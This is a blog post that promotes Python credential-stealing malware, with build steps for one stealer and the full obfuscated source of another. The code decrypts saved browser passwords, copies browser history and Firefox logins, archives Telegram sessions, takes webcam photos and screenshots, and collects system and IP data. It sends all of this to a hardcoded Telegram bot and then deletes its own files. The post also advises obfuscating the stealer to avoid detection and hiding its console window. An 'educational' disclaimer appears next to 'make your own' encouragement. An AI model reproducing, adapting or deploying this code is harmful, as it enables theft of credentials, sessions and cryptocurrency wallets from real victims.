---
layout: post
title: "Right Stealer Source Code Python 2023"
date: 2023-03-08T03:22:42Z
authors: ["Sage Kirk", "Mike Vance"]
categories: ["Development"]
description: "Discord Token Grabber , Password Stealer, Cookie Stealer, File Stealer, Crypto wallet Stealer etc."
thumbnail: "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/builder.png"
image: "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/builder.png"
comments: false
---

## Creal Stealer

Discord Token Grabber , Password Stealer, Cookie Stealer, File Stealer, Crypto wallet Stealer etc.

> Github Link [](https://github.com/Ayhuuu/Creal-Stealer)

## Features:
»Startup

»Discord injection

» Grab Discord Information and HQ Friends.

» Grab Password & cookies.

» Grab Files.

» Shows Crypto Wallets

» Grab metamask/exodus

» Grab Telegram

» Grab chromium based Passwords


## Setup:
first open `install.bat`

and open `builder.bat`

##  Manual Setup:
 
First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py

If you use obfuscator it will be undetectable.

if you have an error while installing try `pip install -r requirements.txt`

Now You need to use pyinstaller to convert python file to exe.

Open CMD and type `pip install auto_py_to_exe`

And after installed `python -m auto_py_to_exe`

Browse file Select `One file and Windows Based (hide the console)`

And after installed `python -m auto_py_to_exe`

Browse file Select `One file and Windows Based (hide the console)`

![](https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png)

And press covert .py .exe

## Pictures:
 
![](https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/CrealNew1.jpg)

![](https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/CrealNew2.png)

![](https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/CrealNew3.png)
 
 
## Disclaimer:

This tool is for educational purposes only. It is coded for you to see how your files are simply stolen and how to take action. Do not use for illegal purposes. We are never responsible for illegal use. **Educational purpose only!**

Right Stealer Source Code Python

What does it steal?

▪️Saved passwords
▪️Browser History
▪️A picture from your webcam
▪️PC info
▪️IP address
▪️Sessions
▪️Screenshot etc.

## Source code

```python
CI='\\AppData\\Roaming\\yandexpasswords.txt'
CH='\\AppData\\Roaming\\historyYANDEX.txt'
CG='\\AppData\\Roaming\\operapasswords.txt'
CF='\\AppData\\Roaming\\historyOPERA.txt'
CE='\\AppData\\Roaming\\chromepasswords.txt'
CD='\\AppData\\Roaming\\history.txt'
CC='\\AppData\\Roaming\\alldata.txt'
CB='\\AppData\\Roaming\\4543t353454.png'
CA='\\historyOPERA.txt'
C9='\\AppData\\Roaming\\Opera Software\\Opera Stable'
C8='НЕту opera'
C7='Opera < 80'
C6='\\history.txt'
C5='history'
C4='\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
C3='\nИспользуется: '
C2='Opera Stable'
C1='Opera Software'
C0='Roaming'
B_='User Data'
Bz='Local'
As='zip'
Ar='History'
Aq='\\operapasswords.txt'
Ap='Нету Chrome'
Ai='\\AppData\\Roaming\\f1.txt'
Ah='\\AppData\\Roaming\\LoginvaultYANDEX.db'
Ag='\\AppData\\Roaming\\historyopera.db'
Af=' Password: '
Ae=' UserName: '
Ad='URL: '
Ac='SELECT action_url, username_value, password_value FROM logins'
Ab='\\AppData\\Roaming\\Loginvault.db'
Aa='__main__'
AZ='Local State'
AY='AppData'
AL='SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;'
AK='\\AppData\\Roaming\\history.db'
AJ='~'
AI='[.] Uh?'
AH='edge'
AG='p'
AF='c'
AE='[.] Type <c> to print or <p> to plot\n[>] '
AD='URL format error!'
AC='www.'
AB='/'
AA='//'
A9='a'
A8=quit
A7=IndexError
z='w+'
x='\\AppData\\Roaming\\LoginvaultOPERA.db'
w='Нету Opera'
u='encrypted_key'
t='os_crypt'
s='r'
i='C:\\\\Users\\\\'
h='utf-8'
f=len
d=range
a='USERPROFILE'
Z=Exception
Y='document'
X='\n'
W='APPDATA'
T='Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет'
S='rb'
R='Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
Q='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
P='User-Agent'
O='Accept'
N=''
H=open
G=None
F='C:\\Users\\'
E=str
C=print
import os as A,sqlite3 as b,win32crypt as U,shutil as V,requests as L,zipfile,getpass as D,win32api as At,platform as A0,time,cv2,sys,json as e,base64 as g
from PIL import ImageGrab as Au
from os.path import basename
from base64 import encodebytes
import random,sqlite3 as b
from shutil import copyfile
from time import sleep
from datetime import datetime as A1,timedelta as A2
import os as A,telebot,sys,psutil as y,GPUtil
from tabulate import tabulate
from Crypto.Cipher import AES as M
import subprocess as Aj,ffpass,configparser as Av
Ak='5590771616:AAFvZmws-u_uXigBUaKS3aHr6d9YHqF23yo'
Al='5136746907'
try:
	def CJ(chromedate):
		A=chromedate
		if A!=86400000000 and A:
			try:return A1(1601,1,1)+A2(microseconds=A)
			except Z as B:C(f"Error: {B}, chromedate: {A}");return A
		else:return N
	def CK():
		D=A.path.join(A.environ[a],AY,Bz,'Google','Chrome',B_,AZ)
		with H(D,s,encoding=h)as E:B=E.read();B=e.loads(B)
		C=g.b64decode(B[t][u]);C=C[5:];return U.CryptUnprotectData(C,G,G,G,0)[1]
	def CL(data,key):
		A=data
		try:B=A[3:15];A=A[15:];C=M.new(key,M.MODE_GCM,B);return C.decrypt(A)[:-16].decode()
		except:
			try:return E(U.CryptUnprotectData(A,G,G,G,0)[1])
			except:return N
except:C('Нету хрома')
try:
	def Aw(chromedate):
		A=chromedate
		if A!=86400000000 and A:
			try:return A1(1601,1,1)+A2(microseconds=A)
			except Z as B:C(f"Error: {B}, chromedate: {A}");return A
		else:return N
	def Ax():
		D=A.path.join(A.environ[a],AY,C0,C1,C2,AZ)
		with H(D,s,encoding=h)as E:B=E.read();B=e.loads(B)
		C=g.b64decode(B[t][u]);C=C[5:];return U.CryptUnprotectData(C,G,G,G,0)[1]
	def Ay(data,key):
		A=data
		try:B=A[3:15];A=A[15:];C=M.new(key,M.MODE_GCM,B);return C.decrypt(A)[:-16].decode()
		except:
			try:return E(U.CryptUnprotectData(A,G,G,G,0)[1])
			except:return N
except:C(w)
try:
	def Aw(chromedate):
		A=chromedate
		if A!=86400000000 and A:
			try:return A1(1601,1,1)+A2(microseconds=A)
			except Z as B:C(f"Error: {B}, chromedate: {A}");return A
		else:return N
	def Ax():
		D=A.path.join(A.environ[a],AY,C0,C1,C2,AZ)
		with H(D,s,encoding=h)as E:B=E.read();B=e.loads(B)
		C=g.b64decode(B[t][u]);C=C[5:];return U.CryptUnprotectData(C,G,G,G,0)[1]
	def Ay(data,key):
		A=data
		try:B=A[3:15];A=A[15:];C=M.new(key,M.MODE_GCM,B);return C.decrypt(A)[:-16].decode()
		except:
			try:return E(U.CryptUnprotectData(A,G,G,G,0)[1])
			except:return N
except:C(w)
try:
	def CM(chromedate):
		A=chromedate
		if A!=86400000000 and A:
			try:return A1(1601,1,1)+A2(microseconds=A)
			except Z as B:C(f"Error: {B}, chromedate: {A}");return A
		else:return N
	def CN():
		D=A.path.join(A.environ[a],AY,Bz,'Yandex','YandexBrowser',B_,AZ)
		with H(D,s,encoding=h)as E:B=E.read();B=e.loads(B)
		C=g.b64decode(B[t][u]);C=C[5:];return U.CryptUnprotectData(C,G,G,G,0)[1]
	def CO(data,key):
		A=data
		try:B=A[3:15];A=A[15:];C=M.new(key,M.MODE_GCM,B);return C.decrypt(A)[:-16].decode()
		except:
			try:return E(U.CryptUnprotectData(A,G,G,G,0)[1])
			except:return N
except:C('Нету Yandex')
def v(bytes,suffix='B'):
	A=1024
	for B in [N,'K','M','G','T','P']:
		if bytes<A:return f"{bytes:.2f}{B}{suffix}"
		bytes/=A
Az=A0.uname()
A_='\nИмя пк: '+E(Az.node)
B0=y.cpu_count(logical=True)
B1='\nОбщее количество ядер процессора:'+E(B0)
Am=y.cpu_freq()
B2='\nЧастота процессора: '+E(Am.max)+'Mhz'
A3=y.virtual_memory()
B3='\nОбщая память ОЗУ: '+E(v(A3.total))
B4='\nДоступно: '+E(v(A3.available))
B5=C3+E(v(A3.used))
B6=y.disk_partitions()
for A4 in B6:
	B7='\nДиск: '+E(A4.device);B8='\nИмя диска: '+E(A4.mountpoint);B9='\nТип файловой системы: '+E(A4.fstype)
	try:AM=y.disk_usage(A4.mountpoint)
	except PermissionError:continue
	BA='\nОбщая память: '+E(v(AM.total));BB=C3+E(v(AM.used));BC='\nСвободно: '+E(v(AM.free))
try:
	BD=GPUtil.getGPUs();CP=[]
	for A5 in BD:BE='\nМодель видеокарты: '+A5.name;BF='\nСвободно памяти в видеокарте: '+f"{A5.memoryFree}MB";BG=f"\nОбщая память видеокарты: {A5.memoryTotal}MB";BH=f"\nТемпература видеокарты в данный момент: {A5.temperature} °C"
except:C('Нету видеокарты')
A6={'C:\\Program Files\\Windows Defender':'Windows Defender','C:\\Program Files\\AVAST Software\\Avast':'Avast','C:\\Program Files\\AVG\\Antivirus':'AVG','C:\\Program Files (x86)\\Avira\\Launcher':'Avira','C:\\Program Files (x86)\\IObit\\Advanced SystemCare':'Advanced SystemCare','C:\\Program Files\\Bitdefender Antivirus Free':'Bitdefender','C:\\Program Files\\DrWeb':'Dr.Web','C:\\Program Files\\ESET\\ESET Security':'ESET','C:\\Program Files (x86)\\Kaspersky Lab':'Kaspersky Lab','C:\\Program Files (x86)\\360\\Total Security':'360 Total Security','C:\\Program Files\\ESET\\ESET NOD32 Antivirus':'ESET NOD32'}
BI=[A6[B]for B in filter(A.path.exists,A6)]
try:
	AN=cv2.VideoCapture(0)
	for CQ in d(30):AN.read()
	CR,BJ=AN.read();cv2.imwrite(A.getenv(W)+'\\4543t353454.png',BJ);AN.release()
except:C(N)
A6=e.dumps(BI)
try:
	def BK():
		with H(A.environ[a]+A.sep+'AppData\\Local\\Google\\Chrome\\User Data\\Local State',s,encoding=h)as D:C=D.read();C=e.loads(C)
		B=g.b64decode(C[t][u]);B=B[5:];B=U.CryptUnprotectData(B,G,G,G,0)[1];return B
	def BL(cipher,payload):return cipher.decrypt(payload)
	def BM(aes_key,iv):return M.new(aes_key,M.MODE_GCM,iv)
	def BN(buff,master_key):
		try:B=buff[3:15];C=buff[15:];D=BM(master_key,B);A=BL(D,C);A=A[:-16].decode();return A
		except Z as E:return'Chrome < 80'
except:C('НЕту хрома')
if __name__==Aa:
	try:
		j=BK();k=A.environ[a]+A.sep+'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data';V.copy2(k,F+D.getuser()+Ab);l=b.connect(F+D.getuser()+Ab);K=l.cursor();K.execute(Ac)
		for J in K.fetchall():
			I=J[0];m=J[1];n=J[2];o=BN(n,j);p=Ad+I+Ae+m+Af+o+X
			with H(A.getenv(W)+'\\chromepasswords.txt',A9)as q:q.write(p)
		try:A.remove(F+D.getuser()+Ab)
		except Z as AO:pass
	except:C(Ap)
def BO(url):
	try:A=url.split(AA);B=A[1].split(AB,1);D=B[0].replace(AC,N);return D
	except A7:C(AD)
def BP(results):
	A=results;B=raw_input(AE)
	if B==AF:
		for (D,E) in sites_count_sorted.items():C(D,E)
	elif B==AG:plt.bar(d(f(A)),A.values(),align=AH);plt.xticks(rotation=45);plt.xticks(d(f(A)),A.keys());plt.show()
	else:C(AI);A8()
try:r=A.path.expanduser(AJ)+C4;BQ=A.listdir(r);AP=A.path.join(r,C5);V.copy2(AP,F+D.getuser()+AK);AQ=b.connect(F+D.getuser()+AK);K=AQ.cursor();AR=AL;K.execute(AR);J=K.fetchall();AS=X.join([E(A)for A in J]);c=H(A.getenv(W)+C6,z);c.write(AS)
except:C(Ap)
def BO(url):
	try:A=url.split(AA);B=A[1].split(AB,1);D=B[0].replace(AC,N);return D
	except A7:C(AD)
def BP(results):
	A=results;B=raw_input(AE)
	if B==AF:
		for (D,E) in sites_count_sorted.items():C(D,E)
	elif B==AG:plt.bar(d(f(A)),A.values(),align=AH);plt.xticks(rotation=45);plt.xticks(d(f(A)),A.keys());plt.show()
	else:C(AI);A8()
try:r=A.path.expanduser(AJ)+C4;BQ=A.listdir(r);AP=A.path.join(r,C5);V.copy2(AP,F+D.getuser()+AK);AQ=b.connect(F+D.getuser()+AK);K=AQ.cursor();AR=AL;K.execute(AR);J=K.fetchall();AS=X.join([E(A)for A in J]);c=H(A.getenv(W)+C6,z);c.write(AS)
except:C(Ap)
try:
	def AT():
		with H(A.environ[a]+A.sep+'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State',s,encoding=h)as D:C=D.read();C=e.loads(C)
		B=g.b64decode(C[t][u]);B=B[5:];B=U.CryptUnprotectData(B,G,G,G,0)[1];return B
	def AU(cipher,payload):return cipher.decrypt(payload)
	def AV(aes_key,iv):return M.new(aes_key,M.MODE_GCM,iv)
	def AW(buff,master_key):
		try:B=buff[3:15];C=buff[15:];D=AV(master_key,B);A=AU(D,C);A=A[:-16].decode();return A
		except Z as E:return C7
except:C(C8)
if __name__==Aa:
	try:
		j=AT();k=A.environ[a]+A.sep+'AppData\\Roaming\\\\Opera Software\\Opera Stable\\Login Data';V.copy2(k,F+D.getuser()+x);l=b.connect(F+D.getuser()+x);K=l.cursor();K.execute(Ac)
		for J in K.fetchall():
			I=J[0];m=J[1];n=J[2];o=AW(n,j);p=Ad+I+Ae+m+Af+o+X
			with H(A.getenv(W)+Aq,A9)as q:q.write(p)
		try:A.remove(F+D.getuser()+x)
		except Z as AO:pass
	except:C(w)
try:
	def AT():
		with H(A.environ[a]+A.sep+'AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State',s,encoding=h)as D:C=D.read();C=e.loads(C)
		B=g.b64decode(C[t][u]);B=B[5:];B=U.CryptUnprotectData(B,G,G,G,0)[1];return B
	def AU(cipher,payload):return cipher.decrypt(payload)
	def AV(aes_key,iv):return M.new(aes_key,M.MODE_GCM,iv)
	def AW(buff,master_key):
		try:B=buff[3:15];C=buff[15:];D=AV(master_key,B);A=AU(D,C);A=A[:-16].decode();return A
		except Z as E:return C7
except:C(C8)
if __name__==Aa:
	try:
		j=AT();k=A.environ[a]+A.sep+'AppData\\Roaming\\\\Opera Software\\Opera GX Stable\\Login Data';V.copy2(k,F+D.getuser()+x);l=b.connect(F+D.getuser()+x);K=l.cursor();K.execute(Ac)
		for J in K.fetchall():
			I=J[0];m=J[1];n=J[2];o=AW(n,j);p=Ad+I+Ae+m+Af+o+X
			with H(A.getenv(W)+Aq,A9)as q:q.write(p)
		try:A.remove(F+D.getuser()+x)
		except Z as AO:pass
	except:C(w)
try:
	def BR(url):
		try:A=url.split(AA);B=A[1].split(AB,1);D=B[0].replace(AC,N);return D
		except A7:C(AD)
	def BS(results):
		A=results;B=raw_input(AE)
		if B==AF:
			for (D,E) in sites_count_sorted.items():C(D,E)
		elif B==AG:plt.bar(d(f(A)),A.values(),align=AH);plt.xticks(rotation=45);plt.xticks(d(f(A)),A.keys());plt.show()
		else:C(AI);A8()
	def BT():
		try:B=A.path.expanduser(AJ)+C9;O=A.listdir(B);I=A.path.join(B,Ar);V.copy2(I,F+D.getuser()+Ag);J=b.connect(F+D.getuser()+Ag);G=J.cursor();K=AL;G.execute(K);L=G.fetchall();M=X.join([E(A)for A in L]);N=H(A.getenv(W)+CA,z);N.write(M)
		except:C(w)
except:pass
BT()
try:
	def BR(url):
		try:A=url.split(AA);B=A[1].split(AB,1);D=B[0].replace(AC,N);return D
		except A7:C(AD)
	def BS(results):
		A=results;B=raw_input(AE)
		if B==AF:
			for (D,E) in sites_count_sorted.items():C(D,E)
		elif B==AG:plt.bar(d(f(A)),A.values(),align=AH);plt.xticks(rotation=45);plt.xticks(d(f(A)),A.keys());plt.show()
		else:C(AI);A8()
	def BU():
		try:B=A.path.expanduser(AJ)+C9;O=A.listdir(B);I=A.path.join(B,Ar);V.copy2(I,F+D.getuser()+Ag);J=b.connect(F+D.getuser()+Ag);G=J.cursor();K=AL;G.execute(K);L=G.fetchall();M=X.join([E(A)for A in L]);N=H(A.getenv(W)+CA,z);N.write(M)
		except:C(w)
except:pass
BU()
try:
	def BV():
		with H(A.environ[a]+A.sep+'AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State',s,encoding=h)as D:C=D.read();C=e.loads(C)
		B=g.b64decode(C[t][u]);B=B[5:];B=U.CryptUnprotectData(B,G,G,G,0)[1];return B
	def BW(cipher,payload):return cipher.decrypt(payload)
	def BX(aes_key,iv):return M.new(aes_key,M.MODE_GCM,iv)
	def BY(buff,master_key):
		try:B=buff[3:15];C=buff[15:];D=BX(master_key,B);A=BW(D,C);A=A[:-16].decode();return A
		except Z as E:return'Yandex < 80'
except:pass
if __name__==Aa:
	try:
		j=BV();k=A.environ[a]+A.sep+'AppData\\Local\\\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data';V.copy2(k,F+D.getuser()+Ah);l=b.connect(F+D.getuser()+Ah);K=l.cursor();K.execute(Ac)
		for J in K.fetchall():
			I=J[0];m=J[1];n=J[2];o=BY(n,j);p=Ad+I+Ae+m+Af+o+X
			with H(A.getenv(W)+Aq,A9)as q:q.write(p)
		try:A.remove(F+D.getuser()+Ah)
		except Z as AO:pass
	except:C(N)
def CS(url):
	try:A=url.split(AA);B=A[1].split(AB,1);D=B[0].replace(AC,N);return D
	except A7:C(AD)
def CT(results):
	A=results;B=raw_input(AE)
	if B==AF:
		for (D,E) in sites_count_sorted.items():C(D,E)
	elif B==AG:plt.bar(d(f(A)),A.values(),align=AH);plt.xticks(rotation=45);plt.xticks(d(f(A)),A.keys());plt.show()
	else:C(AI);A8()
def BZ():
	O='\\AppData\\Roaming\\historyyandex.db'
	try:B=A.path.expanduser(AJ)+'\\AppData\\Local\\\\Yandex\\YandexBrowser\\User Data\\Default';P=A.listdir(B);I=A.path.join(B,Ar);V.copy2(I,F+D.getuser()+O);J=b.connect(F+D.getuser()+O);G=J.cursor();K=AL;G.execute(K);L=G.fetchall();M=X.join([E(A)for A in L]);N=H(A.getenv(W)+'\\historyYANDEX.txt',z);N.write(M)
	except:C(w)
BZ()
try:Ba='D:\\Telegram Desktop\\tdata\\';Bb=V.make_archive('tg1',As,Ba)
except:pass
try:Bc=F+D.getuser()+'\\AppData\\Roaming\\Telegram Desktop\\tdata\\';Bd=V.make_archive('tg2',As,Bc)
except:pass
try:Be='C:\\Program Files\\Telegram Desktop\\tdata\\';Bf=V.make_archive('tg3',As,Be)
except:pass
I=f"https://api.telegram.org/bot{Ak}/sendDocument?chat_id={Al}"
try:
	An=A.path.join(A.getenv(W),'Mozilla\\Firefox');Bg=A.path.join(An,'profiles.ini');Ao=Av.ConfigParser();Ao.read(Bg);r=A.path.normpath(A.path.join(An,Ao.get('Profile0','Path')));Bh=Aj.Popen('ffpass export -d  '+r,shell=True,stdout=Aj.PIPE);Bi=Bh.stdout.read();Bj=E(Bi)
	with H(F+D.getuser()+Ai,A9,encoding=h)as c:c.write(Bj.replace('\\r',X))
	CU=H(F+D.getuser()+Ai,S)
except:pass
Bk={O:Q,P:R}
AX=E(At.GetLogicalDriveStrings())
AX=E(AX.split('\x00')[:-1])
try:Bl=L.get('https://api.ipify.org').text;Bm='http://ip-api.com/json/'+Bl;Bn=L.get(Bm,headers=Bk).text
except:C(N)
try:Bo='Time: '+time.asctime()+X+X+'Cpu: '+A0.processor()+X+'Система: '+A0.system()+' '+A0.release()+'\nДанные локации и IP:'+Bn+'\nДиски:'+AX+E(A_)+E(B1)+E(Am)+E(B2)+E(A3)+E(B3)+E(B4)+E(B5)+E(B7)+E(B8)+E(B9)+E(BA)+E(BB)+E(BC);c=H(A.getenv(W)+'\\alldata.txt',z);c.write(Bo);c.write('\nАнтивирус: '+E(A6))
except:C('Что то то с alldata не так')
try:c.write(E(BE)+E(BF)+E(BG)+E(BH))
except:pass
c.close()
Bp=Au.grab()
Bp.save(A.getenv(W)+'\\sreenshot.jpg')
Bq=i+D.getuser()+CB
Br=i+D.getuser()+CC
Bs=i+D.getuser()+'\\AppData\\Roaming\\sreenshot.jpg'
Bt=i+D.getuser()+CD
Bu=i+D.getuser()+CE
Bv=i+D.getuser()+CF
Bw=i+D.getuser()+CG
Bx=i+D.getuser()+CH
By=i+D.getuser()+CI
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bb,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bd,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bf,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bq,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Br,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bs,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bt,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bu,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bv,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bw,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(Bx,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(By,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post(I,files={Y:H(F+D.getuser()+Ai,S)})
except:C(T)
try:
	with L.Session()as B:B.headers[O]=Q;B.headers[P]=R;B.post('https://api.telegram.org/bot'+Ak+'/sendMessage?chat_id='+Al+'&parse_mode=html&text='+'Stealer by Right Decision')
except:C(T)
time.sleep(2)
try:A.remove(F+D.getuser()+'\\AppData\\Roaming\\sreenshot.png')
except:pass
try:A.remove(F+D.getuser()+CC)
except:pass
try:A.remove(F+D.getuser()+CB)
except:pass
try:A.remove(F+D.getuser()+CE)
except:pass
try:A.remove(F+D.getuser()+CD)
except:pass
try:A.remove(F+D.getuser()+AK)
except:pass
try:A.remove(F+D.getuser()+Ab)
except:pass
try:A.remove(F+D.getuser()+CG)
except:pass
try:A.remove(F+D.getuser()+CF)
except:pass
try:A.remove(F+D.getuser()+'\\AppData\\Roaming\\historyOpera.db')
except:pass
try:A.remove(F+D.getuser()+x)
except:pass
try:A.remove(F+D.getuser()+CI)
except:pass
try:A.remove(F+D.getuser()+CH)
except:pass
try:A.remove(F+D.getuser()+'\\AppData\\Roaming\\historyYANDEX.db')
except:pass
try:A.remove(F+D.getuser()+Ai)
except:pass
try:A.remove(F+D.getuser()+Ah)
except:pass
try:A.remove('tg1.zip')
except:pass
try:A.remove('tg2.zip')
except:pass
try:A.remove('tg3.zip')
except:pass
```

To install the modules run Compile.bat

And do not forget to insert in the script chat id and token of the bot.

If you get an error like this:

The 'typing' package is an obsolete backport of a standard library package and is incompatible with PyInstaller. Please pip uninstall typing then try again.

Then enter into console: pip uninstall typing and then enter y

> Script can be changed and modified by anyone to add features like clipper and other features :-)

**Read Also [How To make free RDP 2023](/blog/2023-03-08-how-to-make-a-free-rdp/)

Stop buying stealers and waste your money, make your own. For more project, look at "Ideas.txt" inside of the zip file. :joy:
